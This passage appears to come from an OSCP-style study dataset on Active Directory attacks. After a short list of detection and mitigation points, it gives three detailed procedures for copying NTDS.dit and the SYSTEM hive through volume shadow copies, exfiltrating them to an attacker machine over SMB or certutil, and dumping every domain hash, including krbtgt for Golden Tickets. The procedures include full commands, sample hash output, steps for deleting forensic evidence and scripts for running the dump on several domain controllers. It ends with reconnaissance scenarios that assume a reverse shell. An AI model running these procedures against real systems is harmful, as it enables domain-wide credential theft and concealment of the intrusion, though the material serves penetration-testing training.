prompts, indicates scripted/automated action)"", ""Event ID 4663 (Object Access): File access audit for NTDS.dit, even via shadow copy path (\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy...) - requires Object Access auditing enabled on C:\\Windows\\NTDS"", ""Event ID 4688 (Process Creation): vssadmin.exe, vshadow.exe, diskshadow.exe, reg.exe executions on DC (especially reg save HKLM\\SYSTEM)"", ""Event ID 5145 (Network Share Access): SMB file transfer of large files (ntds.dit.bak 20-500+ MB) from DC to attacker-controlled share"", ""File Integrity Monitoring (FIM): NTDS.dit copies created in unusual locations (C:\\Temp, C:\\Users\\Public, etc.), SYSTEM hive exports"", ""Network monitoring: Large outbound file transfers from DC (HTTP, SMB, certutil base64 encoding traffic)"", ""Unusual shadow copy enumeration: vssadmin list shadows, wmic shadowcopy commands on DC (rare in normal operations)""], ""mitigation_and_defense"": [""Restrict local Administrator access on Domain Controllers - use tiered admin model (separate accounts for DC administration)"", ""Audit SeBackupPrivilege usage - Event 4672 (Special privileges assigned) when Backup Operators log on"", ""Enable Object Access auditing on C:\\Windows\\NTDS folder - configure SACL to log all file access attempts (Event 4663)"", ""Monitor VSS events 8222/8224 on DCs - alert on ANY shadow copy creation/deletion (legitimate DC backups use different methods)"", ""Deploy EDR with shadow copy monitoring - detect vssadmin, vshadow, diskshadow executions on critical servers"", ""Network segmentation - restrict outbound connections from DCs to only necessary management systems (prevents credential exfiltration)"", ""File Integrity Monitoring on NTDS.dit - alert on any access, copy, or modification attempts"", ""Regular password rotation for privileged accounts (krbtgt hash changes only during functional level upgrade - manually reset: Reset-KrbtgtKeyInteractive cmdlet)"", ""Implement Just-in-Time (JIT) admin access - temporary privilege elevation reduces attack window"", ""Use Windows Defender Application Control (WDAC) or AppLocker to restrict unauthorized tool execution on DCs""]}","[{""title"": ""Scenario 1: vshadow.exe Method (Official OSCP Content)"", ""context"": ""You've gained Domain Admin access as user jeffadmin and established RDP connection to DC1.corp.com domain controller. You have uploaded vshadow.exe (Microsoft signed binary from Windows SDK) to C:\\Tools directory. Goal: Extract complete NTDS.dit database and parse offline on Kali to obtain all domain credentials including krbtgt hash for Golden Ticket. This is the exact method presented in OSCP course materials."", ""objective"": ""Create shadow copy using vshadow.exe with -nw (no-writers) flag for speed, extract NTDS.dit and SYSTEM hive, transfer to Kali, parse with impacket-secretsdump to obtain all NTLM hashes and Kerberos keys"", ""approach"": [""1. CONNECT TO DC: Establish elevated command prompt on DC1 as jeffadmin (Domain Admin). Verify privileges: whoami /groups | findstr Administrators. Ensure vshadow.exe present: dir C:\\Tools\\vshadow.exe"", ""2. CREATE SHADOW COPY: Run vshadow.exe -nw -p C: from C:\\Tools directory. -nw flag disables VSS writers (speeds up creation from minutes to seconds). -p creates persistent shadow copy stored on disk (required for file extraction). Note output: 'Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2' (number increments: 1, 2, 3... for multiple shadows)"", ""3. EXTRACT NTDS.dit: Copy database from shadow copy to accessible location: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\Windows\\NTDS\\ntds.dit C:\\ntds.dit.bak. Use .bak extension to distinguish from live database. Verify copy success: dir C:\\ntds.dit.bak (should show 20+ MB file size). Shadow copy number matches output from step 2 (HarddiskVolumeShadowCopy2 = number 2)"", ""4. SAVE SYSTEM HIVE: Export SYSTEM registry hive containing boot key for NTDS decryption: reg save HKLM\\SYSTEM C:\\system.bak. Boot key encrypts PEK (Password Encryption Keys) in NTDS.dit. Without SYSTEM hive, secretsdump cannot decrypt credentials. Verify: dir C:\\system.bak (~8-15 MB typical size)"", ""5. TRANSFER FILES TO KALI: Use file transfer method (SMB share, Python HTTP server, certutil base64). Example: On Kali: impacket-smbserver share /tmp/loot -smb2support -username kali -password kali. On DC: net use \\\\<KALI_IP>\\share /user:kali kali && copy C:\\ntds.dit.bak \\\\<KALI_IP>\\share\\ && copy C:\\system.bak \\\\<KALI_IP>\\share\\"", ""6. PARSE OFFLINE ON KALI: Navigate to directory with transferred files: cd /tmp/loot. Run secretsdump: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL. LOCAL keyword = offline file parsing (no network to target). Pipe to file for reference: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee credentials.txt"", ""7. EXTRACT CREDENTIALS: Secretsdump outputs: (1) NTLM hashes in format domain\\user:RID:LM:NTLM::: (fourth field is hash), (2) Kerberos keys (AES256, AES128, DES) below main output, (3) krbtgt hash (RID 502) - CRITICAL for Golden Ticket attacks. Parse krbtgt: grep krbtgt credentials.txt"", ""8. CLEANUP ON DC: Delete shadow copy to remove forensic evidence: vssadmin delete shadows /for=C: /all /quiet. Delete extracted files: del C:\\ntds.dit.bak C:\\system.bak. Verify deletion: vssadmin list shadows (should show 'No items found')""], ""commands"": [""ad-vshadow-create-shadow"", ""ad-copy-ntds-from-shadow"", ""ad-reg-save-system-hive"", ""ad-secretsdump-parse-ntds"", ""ad-vssadmin-delete-shadows""], ""expected_outcome"": ""Shadow copy creation completes in 5-10 seconds with -nw flag. NTDS.dit copied successfully (20-500+ MB depending on domain size - corp.com example shows ~40 MB). SYSTEM hive exported (~10 MB). Files transferred to Kali via SMB/HTTP (1-2 minutes depending on connection). Secretsdump parsing completes in 10-60 seconds, outputs ALL domain credentials: Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: (NTLM hash), krbtgt:502:...:1693c6cefafffc7af11ef34d1c788f47::: (Golden Ticket material), dave, stephanie, jeff, jeffadmin, iis_service, and all computer accounts (DC1$, WEB04$, FILES04$, etc.). Kerberos keys extracted including AES256 for each user. Total time: 2-5 minutes from shadow creation to parsed credentials on Kali."", ""why_this_works"": ""NTDS.dit is locked by lsass.exe during normal DC operation (exclusive lock prevents copying). Shadow copies create point-in-time snapshots at the volume/block level BEFORE filesystem locking is enforced. The shadow copy snapshot sees files as they existed at snapshot creation time, without active process locks. Copying from \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy path accesses the snapshot (unlocked) rather than live filesystem (locked). NTDS.dit contains encrypted credentials - encryption uses boot key (syskey) stored in SYSTEM registry hive. Boot key \u2192 decrypts PEK (Password Encryption Keys List) in NTDS.dit \u2192 PEK decrypts individual user password hashes. Secretsdump: (1) Extracts boot key from SYSTEM hive, (2) Locates and decrypts PEK from NTDS.dit, (3) Enumerates user records in database, (4) Decrypts each user's NTLM hash and Kerberos keys using PEK. Result: Plaintext (actually cleartext-equivalent) NTLM hashes usable for Pass-the-Hash attacks, no cracking needed. vshadow.exe -nw speeds up process by disabling VSS writers (application-aware components like SQL, Exchange). Writers ensure application consistency during backup - not needed for NTDS.dit (AD handles its own consistency)."", ""common_mistakes"": [""Forgetting to note shadow copy device number from vshadow output - leads to 'file not found' when copying NTDS.dit. FIX: Run vssadmin list shadows to enumerate devices and find correct number."", ""Using wrong shadow copy number - HarddiskVolumeShadowCopy number increments with each creation (1, 2, 3...). Latest is highest number. FIX: Check vssadmin list shadows for most recent creation time."", ""Omitting -nw flag with vshadow - shadow creation takes 1-5 minutes instead of 5-10 seconds. Writers provide no benefit for NTDS.dit extraction. ALWAYS use -nw for exam time efficiency."", ""Forgetting to save SYSTEM hive - secretsdump fails with 'Cannot decrypt' errors. NTDS.dit alone is useless without boot key. ALWAYS run 'reg save HKLM\\SYSTEM' immediately after copying NTDS.dit."", ""Mismatched NTDS.dit and SYSTEM hive - extracting from different machines or different time periods causes boot key mismatch. ALWAYS extract both files from SAME shadow copy in SAME session."", ""Not deleting shadow copies after extraction - leaves forensic evidence (Event 8222) and consumes disk space. ALWAYS cleanup: vssadmin delete shadows /for=C: /all /quiet"", ""Transferring files with wrong method - certutil base64 encoding corruption, SMB authentication failures. TEST file integrity: Compare file sizes (dir on Windows vs ls -lh on Kali), verify with file command on Kali."", ""Deleting extracted files before successful parsing - transfer corruption or secretsdump error requires re-extraction. VERIFY secretsdump success (grep Administrator credentials.txt shows hash) BEFORE deleting source files on DC."", ""Using 'reg export' instead of 'reg save' for SYSTEM hive - creates text .reg file instead of binary hive format. Secretsdump requires binary. ALWAYS use 'reg save HKLM\\SYSTEM', NOT 'reg export'.""], ""oscp_exam_relevance"": ""HIGH - This exact method appears in OSCP course materials. Extremely common in OSCP exam labs when DC access achieved. Time-efficient (2-5 minutes total), reliable, provides ALL domain credentials at once. EXAM STRATEGY: (1) Prioritize DC compromise for maximum credential harvest. (2) Keep vshadow.exe in toolkit (or know vssadmin alternative). (3) Practice file transfer methods (SMB often blocked, have HTTP/certutil backup). (4) Pre-create secretsdump command template to avoid typos under time pressure. (5) Extract krbtgt hash for Golden Ticket persistence (allows re-access if discovered and kicked out). POINT VALUE: DC credential extraction typically worth 20-25 points (local.txt 10pts + proof.txt 20pts + AD points). TIME MANAGEMENT: 5 minutes extraction + 10-20 minutes analyzing credentials + 15-30 minutes using credentials for lateral movement = 30-55 minutes total for DC phase. ALTERNATIVES: If vshadow.exe upload fails/blocked, use native vssadmin method (Scenario 2). If VSS unavailable, fall back to DCSync (requires replication rights verification first).""}, {""title"": ""Scenario 2: Native vssadmin Method (No Tool Upload)"", ""context"": ""You've compromised DC1 with Domain Admin but cannot upload files (AV blocking uploads, no write permissions in accessible directories, or OPSEC concerns about file transfers). You need to extract NTDS.dit using only native Windows utilities. vssadmin is built-in to Windows Server, requires no upload, and provides same shadow copy functionality (slightly slower creation due to writers enabled)."", ""objective"": ""Extract NTDS.dit database and SYSTEM hive using ONLY native Windows binaries (vssadmin, copy, reg) - zero file uploads required. Demonstrates tool-independent methodology for exam scenarios where tool upload blocked or undesirable."", ""approach"": [""1. VERIFY VSS SERVICE: Check Volume Shadow Copy Service running: sc query vss. Look for STATE: 4 RUNNING. If stopped: net start vss (requires Administrator). VSS enabled by default on Windows Server, rarely stopped unless intentionally disabled."", ""2. CHECK EXISTING SHADOWS: Before creating new shadow copy, enumerate existing: vssadmin list shadows. If recent shadow copies exist (Windows Server Backup, System Restore), USE THOSE to avoid creating new artifacts. Note device name and creation time. Skip to step 4 if usable shadow found."", ""3. CREATE SHADOW COPY (NATIVE): Run vssadmin create shadow /for=C: (no flags needed - tool handles defaults). Creation slower than vshadow -nw (30-60 seconds vs 5-10 seconds) because writers enabled (SQL, Exchange, AD ensure consistency). Output shows: 'Shadow Copy Volume Name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3' - note the number (3 in this example)."", ""4. LIST SHADOWS FOR VERIFICATION: Confirm shadow copy created successfully: vssadmin list shadows. Find most recent entry (latest Creation Time), verify Shadow Copy Device name matches step 3 output. Copy exact device path for use in next step."", ""5. EXTRACT NTDS.dit FROM SHADOW: Use native copy command: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit.bak. Use C:\\Windows\\Temp (writable, less monitored than C:\\Temp). Verify: dir C:\\Windows\\Temp\\ntds.dit.bak (20+ MB confirms success)."", ""6. SAVE SYSTEM HIVE: Export boot key: reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak. Both files now in same directory for easy transfer. Verify: dir C:\\Windows\\Temp\\*.bak (should show both files, ~30-500 MB combined)."", ""7. TRANSFER WITHOUT TOOLS: Native methods only: (a) Certutil base64: certutil -encode ntds.dit.bak ntds.txt, copy-paste text to Kali, certutil -decode ntds.txt ntds.dit.bak (on Kali with certutil wine/Windows VM). (b) SMB share to existing server: net use \\\\FileServer\\Share && copy *.bak \\\\FileServer\\Share\\. (c) RDP clipboard: Enable clipboard sharing, copy files via RDP session (slow, works for small databases)."", ""8. PARSE ON KALI: Same as Scenario 1: impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL | tee creds.txt. Extract Administrator, krbtgt, and user hashes. Time: 10-60 seconds parsing."", ""9. CLEANUP THOROUGHLY: Delete shadow copy: vssadmin delete shadows /for=C: /all /quiet. Remove files: del C:\\Windows\\Temp\\ntds.dit.bak C:\\Windows\\Temp\\system.bak /F /Q. Clear recent file MRU (optional OPSEC): reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs /f""], ""commands"": [""ad-check-vss-service"", ""ad-vssadmin-list-shadows"", ""ad-vssadmin-create-shadow"", ""ad-copy-ntds-from-shadow"", ""ad-reg-save-system-hive"", ""ad-secretsdump-parse-ntds"", ""ad-vssadmin-delete-shadows""], ""expected_outcome"": ""VSS service verified running. Existing shadow copies checked (may find usable snapshot, saves creation time). New shadow copy created in 30-60 seconds with vssadmin (slower than vshadow -nw but acceptable). NTDS.dit and SYSTEM extracted to C:\\Windows\\Temp (native writable location). Files transferred using native Windows methods (certutil, SMB, RDP) without uploading attack tools. Secretsdump parsing yields identical results to Scenario 1: All domain NTLM hashes, Kerberos keys, krbtgt hash for Golden Ticket. Total time: 3-7 minutes (slightly longer than vshadow method due to slower shadow creation and native file transfer limitations). ADVANTAGE: Zero tool uploads (no AV detection, no file transfer IOCs, pure LOLBAS approach). Ideal for heavily monitored environments or OSCP exam machines with upload restrictions."", ""why_this_works"": ""Identical technical mechanism to vshadow method - shadow copies bypass NTDS.dit file lock. Only difference: vssadmin is built-in Windows component (SFC protected, signed by Microsoft, part of OS installation). No upload needed = no file transfer detection, no AV scanning of tools, no suspicious binaries on disk. Trade-off: Slightly slower (writers enabled by default with vssadmin, cannot specify -nw). Writers provide application-level consistency (SQL, Exchange checkpoint) - irrelevant for NTDS.dit (AD maintains its own consistency via ESE transaction logs). 30-60 second creation time vs 5-10 seconds is acceptable in exam context (still <1 minute). Native file transfer methods (certutil, SMB to internal shares, RDP clipboard) leverage existing Windows functionality - harder to detect than wget/curl to external attacker infrastructure. LOLBAS (Living Off The Land Binaries and Scripts) approach: Use built-in OS tools for offensive operations, reduces detection surface."", ""common_mistakes"": [""Not checking for existing shadow copies first - creates unnecessary new shadow (additional Event 8222 forensic artifact). ALWAYS run vssadmin list shadows before creating new."", ""Using vshadow syntax with vssadmin - flags differ. vssadmin uses /for=C:, vshadow uses 'C:' positional. vssadmin has NO -nw equivalent (writers always enabled). Don't mix tool syntax."", ""Saving files to C:\\Temp instead of C:\\Windows\\Temp - C:\\Temp often doesn't exist (requires manual creation: mkdir C:\\Temp). C:\\Windows\\Temp always exists and writable. Prefer existing directories."", ""Forgetting shadow copy number increments - If 2 shadows exist, next creation is number 3 (not 1 or 2). ALWAYS verify with vssadmin list shadows after creation, use most recent."", ""Certutil transfer without base64 validation - Binary file corruption common with copy-paste. VERIFY: Compare file sizes exactly. Test hash: certutil -hashfile ntds.dit.bak SHA256 (on both DC and Kali after transfer)."", ""Attempting to use non-existent network shares - 'net use \\\\FileServer\\Share' fails if share doesn't exist or authentication required. Test connectivity first: dir \\\\FileServer\\Share. Use shares you confirmed during enumeration."", ""Deleting shadow copies BEFORE file transfer completes - Transfer interruption requires re-extraction (shadow already deleted). ALWAYS verify files on Kali (ls -lh, file command) BEFORE cleanup on DC."", ""Using 'vssadmin delete shadows /oldest' instead of /all - Leaves some shadows (partial cleanup). For OPSEC, delete ALL: /all flag. For stealth/backup, keep oldest: /oldest (attacker preference varies).""], ""oscp_exam_relevance"": ""HIGH - Arguably MORE relevant than vshadow method for OSCP exam. Exam scenarios may restrict file uploads (simulating restrictive AV, AppLocker, WDAC). Native tool usage demonstrates deeper understanding and adaptability. EXAM ADVANTAGES: (1) No dependency on uploaded tools (works even if upload vectors blocked). (2) Faster setup (no file transfer time for vshadow.exe). (3) LOLBAS approach valued in professional pentesting. (4) Works on all Windows Server versions (vssadmin built-in since Server 2003). RECOMMENDED APPROACH: Attempt vssadmin native method FIRST. Fall back to vshadow only if vssadmin unavailable (rare). TIME COMPARISON: vssadmin total time (3-7 min) vs vshadow total time (2-5 min) - difference is 1-2 minutes. In 24-hour OSCP exam, 2-minute savings negligible compared to reliability and versatility of native method. CERTIFICATION VALIDITY: HTB, PG Practice, OSCP exam labs ALL have vssadmin (Windows Server standard install). vshadow.exe must be uploaded (may fail in hardened environments).""}, {""title"": ""Scenario 3: Automated diskshadow Scripting"", ""context"": ""You're conducting post-exploitation on multiple Domain Controllers (multi-forest environment, or multiple exam lab DCs). Manual shadow copy creation for each DC is time-consuming and error-prone. diskshadow provides scriptable interface allowing automated, repeatable NTDS.dit extraction across multiple targets. Useful for exam environments with 2-3 DCs, or real-world engagements with dozens of DCs."", ""objective"": ""Create reusable diskshadow script for automated NTDS.dit extraction. Script handles shadow copy creation, NTDS.dit extraction, and optional mounting shadow as drive letter for simplified access. Demonstrates advanced VSS usage and exam-time efficiency through automation."", ""approach"": [""1. CREATE DISKSHADOW SCRIPT FILE: On DC, create script C:\\Windows\\Temp\\extract.txt with content:\n\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\meta.cab\nset verbose on\nadd volume C:\nbegin backup\ncreate\nend backup\n\nExplanation: 'set context persistent nowriters' = equivalent to vshadow -nw -p (persistent shadow, no writers). 'set metadata' = where to store shadow copy metadata (temporary CAB file). 'add volume C:' = target C: drive. 'begin backup/create/end backup' = shadow creation sequence. Create script: Use echo commands or RDP notepad."", ""2. ALTERNATIVE: EXPOSE SCRIPT (EASIER ACCESS): Enhanced script with drive letter mounting:\n\nset context persistent nowriters\nset metadata C:\\Windows\\Temp\\meta.cab\nadd volume C:\ncreate\nexpose %vssc% Z:\n\n'expose %vssc% Z:' mounts shadow copy as Z: drive. Allows copying with simple path: copy Z:\\Windows\\NTDS\\ntds.dit C:\\ntds.dit.bak (instead of complex \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3\\ path). Easier for scripting/automation."", ""3. EXECUTE DISKSHADOW SCRIPT: Run non-interactively: diskshadow /s C:\\Windows\\Temp\\extract.txt. Script executes all commands in sequence. Output shows: 'Alias VShadowID for shadow ID...', 'Shadow copy created successfully'. If using expose method, Z: drive now accessible: dir Z:\\ (shows C: drive snapshot contents)."", ""4. EXTRACT NTDS.dit: Two methods depending on script: (a) Without expose: Copy from shadow device path (get path from diskshadow output or vssadmin list shadows). (b) With expose: Simplified copy from Z: drive: copy Z:\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit.bak. Exposed drive method MUCH easier, reduces typos, better for automation."", ""5. SAVE SYSTEM HIVE: Same as other scenarios: reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak. No special handling needed for diskshadow (SYSTEM hive accessed from live registry, not shadow copy)."", ""6. TRANSFER AND PARSE: Identical to previous scenarios: Transfer both .bak files to Kali, run impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL. Extract credentials."", ""7. CLEANUP DISKSHADOW ARTIFACTS: (a) Unexpose drive letter (if used): diskshadow interactive mode: DISKSHADOW> unexpose Z:. (b) Delete shadow copy: vssadmin delete shadows /for=C: /all /quiet OR diskshadow: DISKSHADOW> delete shadows volume C:. (c) Remove script and metadata: del C:\\Windows\\Temp\\extract.txt C:\\Windows\\Temp\\meta.cab /F /Q."", ""8. AUTOMATION FOR MULTIPLE DCs: Create batch script or PowerShell wrapper to execute on multiple DCs: (1) Copy diskshadow script to each DC via WMI/PSExec. (2) Execute remotely: wmic /node:<DC_IP> process call create \""diskshadow /s C:\\Temp\\extract.txt\"". (3) Transfer extracted files centrally. (4) Batch parse with secretsdump. Saves hours in multi-DC environments.""], ""commands"": [""ad-diskshadow-create-shadow"", ""ad-copy-ntds-from-shadow"", ""ad-reg-save-system-hive"", ""ad-secretsdump-parse-ntds"", ""ad-vssadmin-delete-shadows""], ""expected_outcome"": ""Diskshadow script created successfully in C:\\Windows\\Temp. Script execution completes in 10-30 seconds (similar to vssadmin, writers disabled via 'nowriters' context). If expose method used, Z: drive mounted showing shadow copy contents (dir Z:\\ works). NTDS.dit copied using simplified path (Z:\\Windows\\NTDS\\ntds.dit) - no complex \\\\?\\GLOBALROOT syntax needed. SYSTEM hive saved. Files transferred and parsed with secretsdump - identical credential output. AUTOMATION BENEFIT: Script reusable across multiple DCs without modification (same script, just transfer and execute). Multi-DC extraction time: ~5 minutes per DC vs ~3 minutes setup + 2 minutes per DC with automation (scripting saves time at scale). Total artifacts: extract.txt (script), meta.cab (metadata), exposed Z: drive (if used), shadow copy (Event 8222). Cleanup removes all artifacts."", ""why_this_works"": ""diskshadow is Microsoft's enterprise shadow copy management utility (built-in since Windows Server 2008). Designed for backup scripting and automation. Script file (/s flag) enables non-interactive execution (ideal for automation, remote execution via WMI/PSExec). 'set context persistent nowriters' replicates vshadow -nw -p behavior: persistent storage (required for file extraction) + no writers (faster creation). 'expose' command is diskshadow exclusive feature (vssadmin and vshadow cannot mount shadow copies as drive letters). Exposed drive creates temporary volume mount point (similar to mounting ISO or VHD) - shadow copy accessible via standard drive letter (Z:) instead of object namespace path. Simplifies scripting: copy Z:\\path is easier than copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\path (fewer errors, more readable, better for automation). Shadow copy mechanism identical to other methods - still point-in-time snapshot bypassing file locks. Credentials extracted via same secretsdump process (boot key from SYSTEM, decrypt PEK, enumerate NTDS.dit users)."", ""common_mistakes"": [""Script syntax errors - diskshadow scripting is sensitive. Common errors: (1) Missing 'set context' before 'create' (defaults to non-persistent or wrong context). (2) No volume added ('add volume C:' required before 'create'). (3) Invalid metadata path (directory must exist). TEST script: Run diskshadow interactively first, paste commands one-by-one to verify syntax."", ""Metadata path in read-only location - 'set metadata C:\\Windows\\System32\\meta.cab' fails (System32 often protected). USE: C:\\Windows\\Temp\\meta.cab (always writable) or C:\\Temp\\meta.cab (if directory exists)."", ""Forgetting to unexpose drive letter - Z: drive remains mounted after shadow deletion attempt, blocks cleanup. Unexpose BEFORE deleting shadow: diskshadow \u2192 unexpose Z: \u2192 exit \u2192 vssadmin delete shadows. Or use diskshadow's own delete: DISKSHADOW> delete shadows volume C: (auto-unexposes)."", ""Using expose without drive letter availability - If Z: already in use (mapped network drive, USB device), expose fails. CHECK available letters first: wmic logicaldisk get caption (shows used letters). Use alternate letter: expose %vssc% Y: (Y, X, W typically free)."", ""Incorrect script encoding - Creating script with UTF-16 or BOM (Byte Order Mark) causes parsing errors. diskshadow expects ANSI/ASCII. CREATE script with echo commands (ANSI by default): echo set context persistent nowriters > script.txt OR use notepad with ANSI encoding (File \u2192 Save As \u2192 Encoding: ANSI)."", ""Running diskshadow interactively by mistake - Typing 'diskshadow' without /s flag enters interactive mode (DISKSHADOW> prompt). Requires manual command entry, defeats automation purpose. ALWAYS use script mode for automation: diskshadow /s <script_file>"", ""Not cleaning metadata CAB files - meta.cab left in C:\\Windows\\Temp contains shadow copy configuration details (forensic artifact). DELETE after extraction: del C:\\Windows\\Temp\\meta.cab /F /Q. Check size first (should be <1 MB, just XML metadata).""], ""oscp_exam_relevance"": ""MEDIUM-HIGH - Advanced technique, less likely needed in OSCP (typically 1-2 DCs, manual extraction sufficient). HOWEVER, demonstrates: (1) Deep VSS understanding beyond basic vssadmin/vshadow. (2) Scripting and automation skills (valued in professional pentesting). (3) Alternative approach if vssadmin/vshadow unavailable (diskshadow is separate binary, may work when others blocked). (4) Expose feature simplifies complex commands (exam stress = typos, Z:\\path easier than \\\\?\\GLOBALROOT\\Device\\... paths). EXAM USE CASE: If encountering errors with vssadmin/vshadow shadow copy paths (typos, path too long, copy failures), diskshadow expose method provides simpler alternative (mount as Z:, copy like normal drive). TIME INVESTMENT: Script creation adds 1-2 minutes overhead vs direct vssadmin command. ONLY worthwhile if: (1) Multiple DCs to extract (2+ DCs = automation saves time), (2) Path complexity causing errors (expose simplifies), (3) Already familiar with diskshadow (no learning curve). RECOMMENDATION: Master vssadmin native method first (Scenario 2), use diskshadow as advanced/alternative technique for edge cases.""}]","[]"
"ad-initial-reconnaissance","Active Directory Initial Reconnaissance","First steps when landing on a domain-joined Windows machine - discover domain structure, identify critical objects, and establish enumeration baseline","ACTIVE_DIRECTORY|ENUMERATION|RECONNAISSANCE|OSCP:HIGH|STARTER|DOMAIN_RECON","{""how_to_recognize"": [""You have command execution on a Windows machine (shell, RDP, WinRM)"", ""Machine is domain-joined (systeminfo shows Domain: not WORKGROUP)"", ""You have domain user credentials (even low-privilege)"", ""Need to understand AD environment before targeted attacks""], ""when_to_look_for"": [""Immediately after initial access to any domain-joined Windows machine"", ""Before attempting Kerberoasting, ACL abuse, or lateral movement"", ""When credentials work but you don't know the domain structure"", ""During OSCP exam when you compromise a Windows box (always check domain membership)""]}","[{""title"": ""Scenario 1: Initial Shell on Domain Workstation"", ""context"": ""You exploited a web vulnerability and got a reverse shell as 'corp\\webuser' on a Windows 10 workstation. The shell is interactive but you don't have PowerShell access yet. You need to quickly determine if this is a domain environment and what the domain structure looks like."", ""approach"": ""Start with zero-dependency tools (net.exe) to confirm domain membership and enumerate basic objects. These commands work from any Windows shell (cmd.exe) without requiring PowerShell, admin rights, or external tools. Build situational awareness before loading advanced tooling."", ""commands"": [""net-user-domain-list"", ""net-group-domain-admins"", ""net-group-domain-computers"", ""setspn-list-all"", ""net-domain-controllers""], ""expected_outcome"": ""You'll discover: domain name (corp.com), domain controllers (DC01.corp.com), privileged users (Domain Admins members), service accounts (SPNs registered), and computer count. This baseline tells you whether this is a simple 1-DC setup or complex multi-tier environment."", ""why_this_works"": ""Built-in net.exe and setspn.exe communicate directly with domain controllers via LDAP (port 389) and SMB (port 445). These tools are available on all Windows versions and require only domain user credentials (which you already have as corp\\webuser). No special permissions needed for read-only enumeration.""}, {""title"": ""Scenario 2: RDP Access with PowerShell Available"", ""context"": ""You discovered credentials 'corp\\helpdesk:Password123' and successfully logged in via RDP. You have PowerShell access and want to perform comprehensive enumeration without loading external modules (avoiding detection). The domain is corp.com with multiple domain controllers."", ""approach"": ""Use manual PowerShell LDAP queries (.NET DirectorySearcher) to enumerate objects without importing PowerView or other suspicious modules. This approach uses native Windows .NET framework classes that are present on all domain-joined machines and generate normal LDAP traffic."", ""commands"": [""ps-ldapsearch-function"", ""ps-ldapsearch-users"", ""ps-ldapsearch-computers"", ""ps-ldapsearch-groups"", ""ps-ldapsearch-spns"", ""ps-ldapsearch-admins""], ""expected_outcome"": ""You'll extract: all user accounts (with properties like lastLogon, pwdLastSet, userAccountControl), all computers (with OS version, lastLogon), all groups (with memberOf chains), and all SPNs (Kerberoastable targets). Output is PowerShell objects that you can filter/sort (e.g., 'where adminCount -eq 1' for privileged accounts)."", ""why_this_works"": ""DirectorySearcher is a .NET class that performs LDAP queries. It's built into Windows (System.DirectoryServices assembly) and used by legitimate Windows tools (Active Directory Users and Computers). Your LDAP queries look identical to normal AD authentication traffic, making them hard to detect. You're essentially replicating what PowerView does, but with native code.""}, {""title"": ""Scenario 3: PowerView Available - Comprehensive Enumeration"", ""context"": ""You have a stable PowerShell session, already imported PowerView (Dev.ps1), and need to perform rapid comprehensive enumeration. Time is limited (OSCP exam scenario) and you need actionable intelligence quickly. The domain is corp.com with 200+ users and 50+ computers."", ""approach"": ""Use PowerView's automated cmdlets to enumerate all critical objects in parallel. PowerView aggregates LDAP queries, resolves SIDs, and presents data in attacker-friendly format. This is the fastest enumeration method when stealth is not a concern."", ""commands"": [""powerview-get-netdomain"", ""powerview-get-netdomaincontroller"", ""powerview-get-netuser-spn"", ""powerview-get-netgroup-recursive"", ""powerview-get-netcomputer-ping"", ""powerview-get-netou"", ""powerview-get-netgpo""], ""expected_outcome"": ""Within 2-3 minutes you'll have: domain metadata (forest structure, trusts, DCs), all Kerberoastable accounts (for AS-REP roasting), group memberships (who's in Domain Admins), live computers (pingable targets), OUs (organizational structure), and GPOs (potential GPP passwords in SYSVOL). This gives you multiple attack vectors to pursue."", ""why_this_works"": ""PowerView is a PowerShell wrapper around LDAP/SMB APIs. It performs the same queries as manual LDAP enumeration but automates filtering, SID resolution, and recursive group membership lookups. Each cmdlet generates normal LDAP traffic (port 389) that blends with legitimate AD operations. Detection requires endpoint monitoring (PowerShell logging) not network-based detection.""}, {""title"": ""Scenario 4: Restricted Shell - Legacy Tools Only"", ""context"": ""You have command execution via a web shell but PowerShell is blocked (AppLocker/WDAC policy). The environment only allows legacy Windows executables (net.exe, dsquery.exe, setspn.exe). You need to enumerate the domain using only these constrained tools."", ""approach"": ""Leverage dsquery.exe for advanced LDAP queries when net.exe output is insufficient. Dsquery provides LDAP filter capabilities without requiring PowerShell. Combine with setspn.exe for SPN discovery. This is your fallback enumeration strategy when modern tools are blocked."", ""commands"": [""dsquery-users"", ""dsquery-computers"", ""dsquery-admins"", ""setspn-list-all"", ""dsquery-domain-controllers""], ""expected_outcome"": ""You'll enumerate: all user DNs (distinguished names like CN=jsmith,OU=Users,DC=corp,DC=com), computer DNs, Domain Admins group members, SPNs (for Kerberoasting), and DC hostnames. Output is less friendly than PowerView (LDAP DNs instead of usernames) but contains the same intelligence. Pipe output to 'dsget user -samid' to convert DNs to usernames."", ""why_this_works"": ""Dsquery.exe is a built-in Windows tool (installed with RSAT or available on domain controllers) that performs LDAP queries. It predates PowerShell and is often overlooked by security policies that block PowerShell but allow legacy executables. The tool communicates directly with domain controllers via LDAP (port 389) using your domain credentials.""}]","[{""title"": ""Phase 1: Confirm Domain Membership & Identify DCs"", ""notes"": ""First verify you're in a domain environment (not standalone/workgroup). Identify domain controllers (primary targets for enumeration). These commands work from any Windows shell without special privileges."", ""commands"": [{""id"": ""net-user-domain-list"", ""example"": ""net user /domain"", ""shows"": ""User accounts for \\\\""}, {""id"": ""net-domain-controllers"", ""example"": ""nltest /dclist:corp.com"", ""shows"": ""PDC""}]}, {""title"": ""Phase 2: Basic Object Enumeration (Legacy Tools)"", ""notes"": ""Enumerate users, groups, and computers using built-in net.exe commands. This works in highly restricted environments (AppLocker, constrained language mode). Start here if PowerShell is 